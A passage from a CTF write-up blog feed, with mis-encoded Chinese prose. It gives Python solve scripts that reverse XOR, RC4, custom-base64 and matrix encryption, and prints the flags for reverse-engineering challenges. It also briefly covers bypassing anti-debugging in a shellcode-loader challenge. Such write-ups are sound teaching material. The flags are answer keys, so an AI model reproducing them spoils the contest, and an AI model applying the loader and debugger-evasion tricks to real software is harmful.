class="hljs-number">0xa7</span>, <span class="hljs-number">0x73</span>,<br>     <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6f</span>,<br>     <span class="hljs-number">0x37</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x6b</span>,<br>     <span class="hljs-number">0x35</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x2e</span>]<br><br>enc=[<span class="hljs-number">0x14</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x9E</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xF9</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x8E</span>,<span class="hljs-number">0x9F</span>,<br>     <span class="hljs-number">0xB2</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0xDC</span>,<span class="hljs-number">0x36</span>,<br>     <span class="hljs-number">0x69</span>,<span class="hljs-number">0xA4</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0xC4</span>,<span class="hljs-number">0xC6</span>,<span class="hljs-number">0xD5</span>,<span class="hljs-number">0xE6</span>,<span class="hljs-number">0x5F</span>,<br>     <span class="hljs-number">0x50</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0xF7</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0xC6</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xF9</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0x74</span>,<br>     <span class="hljs-number">0x24</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x7E</span>]<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    tmp=enc[i]^i^key[i]<br>    flag+=<span class="hljs-built_in">chr</span>(tmp)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># DASCTF&#123;lsTzx-c5c21iVA-goojqNS-ynFOPRx-489itUh&#125;</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸åšæ³•åº”è¯¥å†™è„šæœ¬æ¨¡æ‹Ÿæ‰€æœ‰æ“ä½œå¹¶traceï¼Œè¿™é‡Œå°å°çŒœæµ‹ä¸€æ‰‹ï¼Œç®—æ˜¯ç‰¹è§£</p><h1 id="ä¿¡åˆ›å®‰å…¨"><a href="#ä¿¡åˆ›å®‰å…¨" class="headerlink" title="ä¿¡åˆ›å®‰å…¨"></a>ä¿¡åˆ›å®‰å…¨</h1><h2 id="X1-1"><a href="#X1-1" class="headerlink" title="X1-1"></a>X1-1</h2><p>ä¸¤æ¬¡è§£åŒ…hapæ–‡ä»¶å¾—åˆ°moudles.abcæ–‡ä»¶ï¼Œåç¼–è¯‘åæ‰¾åˆ°Indexç±»ï¼Œå‘ç°å…³é”®åŠ å¯†</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765612247844-59efe042-d97f-475e-ba90-d3073ca91dd4.png" class="" title="img"><p>arg0æ˜¯inputï¼Œarg1æ˜¯3*3çŸ©é˜µï¼Œarg2æ˜¯theSecondKeyï¼Œarg3æ˜¯arc4Key</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765612601043-42cd77e9-f0df-4b90-9ec8-c566112147f2.png" class="" title="img"><p>åˆ†åˆ«è¿›è¡ŒçŸ©é˜µåŠ å¯†ï¼ˆè¾“å…¥å’Œarg1ï¼‰ï¼Œå¼‚æˆ–ï¼Œrc4ï¼Œè‡ªå®šä¹‰ç è¡¨çš„ base64</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765612786647-02f61ed3-79e0-42f4-a209-9f46f0022206.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>cipher = <span class="hljs-string">&quot;37L9UF8uNl1TSgYMLIW/RosGPMxVYXNcUoTTQXihX8ZyaQVgxY9Ywz/0fIwRzI4H&quot;</span><br>key2 = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">90</span>, <span class="hljs-number">60</span>, <span class="hljs-number">231</span>, <span class="hljs-number">145</span>, <span class="hljs-number">47</span>])<br>rc4_key = <span class="hljs-string">b&quot;HarMonyOS_S3cur3_K3y!2025&quot;</span><br><br>custom_b64 = <span class="hljs-string">&quot;3GHIJKLMzxy01245PQRSTUFabcdefghijklmnopqrstuv6789+/NOVWXYZABCDEw&quot;</span><br>std_b64 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>translate_table = <span class="hljs-built_in">str</span>.maketrans(custom_b64, std_b64)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_b64_decode</span>(<span class="hljs-params">s</span>):<br>    std_s = s.translate(translate_table)<br>    <span class="hljs-keyword">return</span> base64.b64decode(std_s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">data, key</span>):<br>    cipher = ARC4.new(key)<br>    <span class="hljs-keyword">return</span> cipher.decrypt(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_decrypt</span>(<span class="hljs-params">data, key</span>):<br>    result = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>        result.append(byte ^ key[i % <span class="hljs-built_in">len</span>(key)])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extended_gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼Œè¿”å› (gcd, x, y) ä½¿å¾— ax + by = gcd(a, b)&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    gcd, x1, y1 = extended_gcd(b % a, a)<br>    x = y1 - (b // a) * x1<br>    y = x1<br>    <span class="hljs-keyword">return</span> gcd, x, y<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_inverse</span>(<span class="hljs-params">a, m</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®— a åœ¨æ¨¡ m ä¸‹çš„é€†å…ƒ&quot;&quot;&quot;</span><br>    gcd, x, _ = extended_gcd(a, m)<br>    <span class="hljs-keyword">if</span> gcd != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;a&#125;</span> åœ¨æ¨¡ <span class="hljs-subst">&#123;m&#125;</span> ä¸‹æ²¡æœ‰é€†å…ƒ&quot;</span>)<br>    <span class="hljs-keyword">return</span> x % m<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_inverse_mod</span>(<span class="hljs-params">matrix, mod=<span class="hljs-number">256</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—çŸ©é˜µåœ¨æ¨¡ mod ä¸‹çš„é€†çŸ©é˜µï¼ˆä½¿ç”¨ä¼´éšçŸ©é˜µæ³•ï¼‰&quot;&quot;&quot;</span><br>    n = <span class="hljs-built_in">len</span>(matrix)<br><br>    <span class="hljs-comment"># è®¡ç®—è¡Œåˆ—å¼ï¼ˆæ¨¡ modï¼‰</span><br>    det = <span class="hljs-built_in">int</span>(np.<span class="hljs-built_in">round</span>(np.linalg.det(matrix))) % mod<br>    <span class="hljs-keyword">if</span> det == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;çŸ©é˜µè¡Œåˆ—å¼ä¸º0ï¼Œä¸å¯é€†&quot;</span>)<br><br>    <span class="hljs-comment"># è®¡ç®—è¡Œåˆ—å¼çš„æ¨¡é€†</span><br>    det_inv = mod_inverse(det, mod)<br><br>    <span class="hljs-comment"># è®¡ç®—ä¼´éšçŸ©é˜µ</span><br>    adj = np.zeros((n, n), dtype=<span class="hljs-built_in">int</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            <span class="hljs-comment"># è®¡ç®—ä»£æ•°ä½™å­å¼</span><br>            <span class="hljs-comment"># åˆ é™¤ç¬¬iè¡Œç¬¬jåˆ—</span><br>            minor = np.delete(np.delete(matrix, i, axis=<span class="hljs-number">0</span>), j, axis=<span class="hljs-number">1</span>)<br>            <span class="hljs-comment"># è®¡ç®—ä½™å­å¼</span><br>            cofactor = (-<span class="hljs-number">1</span>) ** (i + j) * <span class="hljs-built_in">int</span>(np.<span class="hljs-built_in">round</span>(np.linalg.det(minor)))<br>            <span class="hljs-comment"># ä¼´éšçŸ©é˜µæ˜¯ä»£æ•°ä½™å­å¼çŸ©é˜µçš„è½¬ç½®</span><br>            adj[j][i] = cofactor % mod<br><br>    <span class="hljs-comment"># è®¡ç®—é€†çŸ©é˜µï¼šä¼´éšçŸ©é˜µ Ã— è¡Œåˆ—å¼é€†å…ƒ (æ¨¡ mod)</span><br>    inv_matrix = (adj * det_inv) % mod<br>    <span class="hljs-keyword">return</span> inv_matrix<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_decrypt</span>(<span class="hljs-params">data</span>):<br>    M = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],<br>         [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>],<br>         [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]<br><br>    inv_M = matrix_inverse_mod(M, <span class="hljs-number">256</span>)<br><br>    decrypted = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">3</span>):<br>        block = data[i:i + <span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment"># çŸ©é˜µä¹˜æ³•ï¼šP = M^&#123;-1&#125; * C (mod 256)</span><br>        x, y, z = block<br>        x_dec = (inv_M[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] * x + inv_M[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] * y + inv_M[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] * z) % <span class="hljs-number">256</span><br>        y_dec = (inv_M[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] * x + inv_M[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] * y + inv_M[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] * z) % <span class="hljs-number">256</span><br>        z_dec = (inv_M[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] * x + inv_M[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] * y + inv_M[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] * z) % <span class="hljs-number">256</span><br>        decrypted.extend([x_dec, y_dec, z_dec])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted)<br><br><br>step1 = custom_b64_decode(cipher)<br>step2 = rc4_decrypt(step1, rc4_key)<br>step3 = xor_decrypt(step2, key2)<br>step4 = matrix_decrypt(step3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>,step4)<br><span class="hljs-comment">#DASCTF&#123;H4rmOny0S_Mult1_L4y3r_Crypt0_M4st3r!&#125;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å…ˆbase64å’Œrc4è§£å¯†</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765615494302-346b70f8-11c5-43ab-9889-f2ce73234743.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> Matrix<br><br>A = [<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],<br>]<br><br>out = <span class="hljs-built_in">bytearray</span>(binascii.unhexlify(<span class="hljs-string">&quot;5a3ce7e6671be974c53bc174b8b742cc6e9e62e00547c2fddcf763f889566ed2b8037923d4d3a1ba470813d11c71299a&quot;</span>))<br><br>xor_key = [<span class="hljs-number">90</span>, <span class="hljs-number">60</span>, <span class="hljs-number">231</span>, <span class="hljs-number">145</span>, <span class="hljs-number">47</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(out)):<br>    out[i] ^= xor_key[i % <span class="hljs-built_in">len</span>(xor_key)]<br><br>n = <span class="hljs-built_in">len</span>(A)<br><br>cipther = np.frombuffer(<span class="hljs-built_in">bytes</span>(out), dtype=np.uint8)<br><br>inv = Matrix(np.array(A, dtype=<span class="hljs-built_in">int</span>)).inv_mod(<span class="hljs-number">256</span>)<br><br>out = <span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> cipther.reshape(-<span class="hljs-number">1</span>, n):<span class="hljs-comment">#-1 è¡¨ç¤ºè‡ªåŠ¨è®¡ç®—è¡Œæ•°</span><br>    plain = (inv @ block) % <span class="hljs-number">256</span><br>    out.extend(plain.astype(np.uint8))<br><br><span class="hljs-built_in">print</span>(out)<br></code></pre></td></tr></table></figure><p>æ•´ä½“é€»è¾‘å¾ˆæ¸…æ™°ï¼Œå°±æ˜¯æ¯”èµ›æœŸé—´å†™ä¸å‡ºçŸ©é˜µç›¸å…³ä»£ç ğŸ¤”</p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>base32</tag>
      
      <tag>çŸ©é˜µ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2025åˆèµ›wp</title>
    <link href="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="DontDebugMe"><a href="#DontDebugMe" class="headerlink" title="DontDebugMe"></a>DontDebugMe</h2><p>åˆ å»åè°ƒè¯•ï¼Œ401000å‡½æ•°äº§ç”Ÿå›ºå®šå€¼v5ï¼Œåˆ†åˆ«è°ƒè¯•å¾—åˆ°å¼‚æˆ–å’ŒåŠ çš„å€¼</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762581592282-8d715eeb-2e07-4ac4-8793-1d479dc98c7d-17632831866371.png" class="" title="img"><p>ä¸¤ä½ä¸€ç»„æå–æ•°æ®ç„¶åå†™é€†å‘è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#0x4c79</span><br><span class="hljs-comment"># print(hex(0x685+0x4144))</span><br><span class="hljs-comment"># print(hex(0xa9e9^0xee20))</span><br><span class="hljs-comment">#0x685ee20</span><br><br>a=[<span class="hljs-number">0xA9E9</span>,<span class="hljs-number">0xA7F8</span>,<span class="hljs-number">0xA2F9</span>,<span class="hljs-number">0xD620</span>,<span class="hljs-number">0xD69A</span>,<span class="hljs-number">0xD9C8</span>,<span class="hljs-number">0xD399</span>,<span class="hljs-number">0x85CB</span>,<span class="hljs-number">0xD29B</span>,<span class="hljs-number">0xD5C7</span>,<span class="hljs-number">0x8496</span>,<span class="hljs-number">0xD4C9</span>,<span class="hljs-number">0xD89A</span>,<span class="hljs-number">0xD7CA</span>,<span class="hljs-number">0xD59C</span>,<span class="hljs-number">0x85C8</span>,<span class="hljs-number">0xD597</span>,<span class="hljs-number">0x859E</span>,<span class="hljs-number">0xD49C</span>,<span class="hljs-number">0x6DCA</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=(a[i]^<span class="hljs-number">0xee20</span>)-<span class="hljs-number">0x685</span><br>    <span class="hljs-comment">#print(hex(a[i]),end=&quot;,&quot;)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]&amp;<span class="hljs-number">0xff</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i]&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;152c147fe66b51dd450e375ce259e74e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="BasicLoader-1"><a href="#BasicLoader-1" class="headerlink" title="BasicLoader-1"></a>BasicLoader-1</h2><p>mainå…ˆä¼šå¯¹æ ¼å¼è¿›è¡Œåˆ¤æ–­</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762614414189-edb6ae70-8fb7-44f8-b973-0e1f92e89298-17632831866383.png" class="" title="img"><p>å¦‚æœç¬¦åˆæ ¼å¼å°±ä¼ å…¥StartAddressä½œä¸ºå­çº¿ç¨‹å…¥å£ï¼Œä¸»çº¿ç¨‹ä¼šè¢«é˜»å¡ï¼Œç›´åˆ° StartAddress æ‰§è¡Œå®Œæ¯•</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613936217-9423ce06-619e-4dd1-ab73-9c2b0b7ea9ad-17632831866385.png" class="" title="img"><p>ç›´æ¥è¿è¡Œç¨‹åºå‘ç°æœ‰ä¸ä¸€æ ·çš„è¾“å‡º</p><p>å»çœ‹å‡½æ•°åˆ—è¡¨å‘ç°æœ‰æ˜æ˜¾çš„tlsï¼Œæ–­ç‚¹å¤„æœ‰åè°ƒè¯•ï¼Œç›´æ¥ç»•è¿‡æˆ–è€…patchéƒ½è¡Œï¼Œä¹‹åStartAddressä¼šè¢«èµ‹å€¼ä¸ºç‰¹å®šå­—èŠ‚</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762614112664-744b727f-27f0-4779-9426-08b2038d52d4-17632831866387.png" class="" title="img"><p>åˆ†æç¬¬ä¸€éƒ¨åˆ†ä¼šè·³è½¬åˆ°æ–°çš„åœ°å€</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762614228847-0247bf52-7fd4-46d9-b8f6-e79cc1fe301b-17632831866389.png" class="" title="img"><p>è·Ÿè¸ªè¿‡å»å‘ç°æ¥åˆ°step2</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613633453-7c432ec3-beb5-4a74-8969-8ed3b13da533-176328318663811.png" class="" title="img"><p>ä¸‹é¢æ˜¯æ ‡å‡†rc4åŠ å¯†</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613661929-2ffc2d50-2f71-44da-9c31-066f31d04514-176328318663813.png" class="" title="img"><p>æ¯”èµ›è°ƒè¯•æ€»ä¼šé‡åˆ°å¼‚å¸¸ï¼Œèµ›åæ‰è°ƒå‡ºæ¥ï¼Œä¸»è¦é—®é¢˜æ˜¯ä¸‹è½½äº†ntdll.pdbæ–‡ä»¶å¯¼è‡´ä¼šå‡ºç°å¾ˆå¤šå¼‚å¸¸</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762672554710-2482a021-f95b-4239-ab85-65004c3f9bcb-176328318663815.png" class="" title="img"><p>åŠ å¯†åä¼šæŠŠå¾—åˆ°çš„å¯†æ–‡å½“æˆå­—èŠ‚ç ä½œä¸ºä¸€ä¸ªå‡½æ•°å¯¹è¾“å…¥è¿›è¡Œå¤„ç†å¹¶åˆ¤æ–­</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762613722289-1a530432-dd99-4b8a-8d7e-d0193a8ccb2b-176328318663817.png" class="" title="img"><p>å¦‚æœå¯ä»¥è°ƒè¯•å°±å¯ä»¥ç›´æ¥çœ‹</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762671450934-62480510-2ca9-4d1d-b6c8-4db459987b27-176328318663819.png" class="" title="img"><p>æŒ‰ç…§é¢˜ç›®æè¿°å’Œå…æ€å¸¸è§æ€è·¯ï¼Œå¦ä¸€ç§æ–¹å¼æ˜¯ç›´æ¥rc4è§£å¯†åæŠŠæ˜æ–‡ä½œä¸ºæ–‡ä»¶å¯¼å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x68</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x1B</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0xB3</span>,<span class="hljs-number">0xEE</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0xB7</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0xA2</span>,<span class="hljs-number">0xAF</span>,<span class="hljs-number">0x8A</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0xFF</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0xDF</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0xB4</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0xDA</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x8B</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0x97</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x10</span>,<span 